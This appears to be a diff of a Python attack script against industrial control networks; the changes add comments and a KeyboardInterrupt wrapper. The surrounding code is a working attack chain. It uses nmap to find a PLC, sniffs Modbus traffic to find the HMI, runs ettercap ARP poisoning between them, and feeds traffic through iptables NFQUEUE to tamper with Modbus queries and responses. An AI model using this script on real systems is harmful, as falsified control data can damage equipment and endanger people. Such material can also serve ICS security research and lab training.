@@ -9,6 +9,7 @@ from multiprocessing import Process
 plc_ip = ''
 hmi_ip = ''
 
+# plc ip
 def scan():
         nm = nmap.PortScanner()
         net = input("enter your network : ")
@@ -20,6 +21,7 @@ def scan():
                 plc_ip = host
                 print("PLC IP : {}".format(plc_ip))
 
+# hmi ip
 def psniff(plcip):
         fil = "dst host {} and dst port 502 and tcp[13] = 0x18".format(plcip)
         p = sniff(iface="eth0", count=1, filter=fil)
@@ -28,6 +30,7 @@ def psniff(plcip):
         hmi_ip = x[IP].src
         print("HMI IP : {}".format(hmi_ip))
 
+# get plc & hmi ip
 def get_ip():
         scan()
         arp1 = 'nohup ettercap -Tq -i eth0 -M ARP /{}// >/dev/null 2>&1 &'.format(plc_ip)
@@ -36,6 +39,7 @@ def get_ip():
         os.system('pkill -f ettercap')
         sleep(1)
 
+# arp mitm
 def arp_spoofing():
         arp2 = 'nohup ettercap -Tq -i eth0 -M ARP /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
         os.system(arp2)
@@ -46,6 +50,7 @@ def arp_spoofing():
         print("ARP Poisoning start !!")
         sleep(4)
 
+# modbus query data injection
 def query_pkt(packet):
     try:
         z = IP(packet.get_payload())
@@ -71,6 +76,7 @@ def query_pkt(packet):
     except AttributeError:
         packet.accept()
 
+# modbus response data injection
 def response_pkt(packet):
         try:
             z = IP(packet.get_payload())
@@ -94,6 +100,7 @@ def response_pkt(packet):
         except AttributeError:
             packet.accept()
 
+# Capturing packets with NetfilterQueue & iptables 
 def query_injection():
 	QUEUE_NUM = 0
 	os.system("iptables -I OUTPUT -p tcp -d {plc1} -j NFQUEUE --queue-num 0".format(plc1=plc_ip))
@@ -120,7 +127,7 @@ def response_injection():
                 sleep(3)
         queue.unbind()
 
-
+# main function (multiprocess)
 def main():
         get_ip()
         arp_spoofing()
@@ -128,5 +135,7 @@ def main():
         p2 = Process(target=response_injection)
         p1.start()
         p2.start()
-
-main()
+try:
+   main()
+except KeyboardInterrupt:
+   exit()
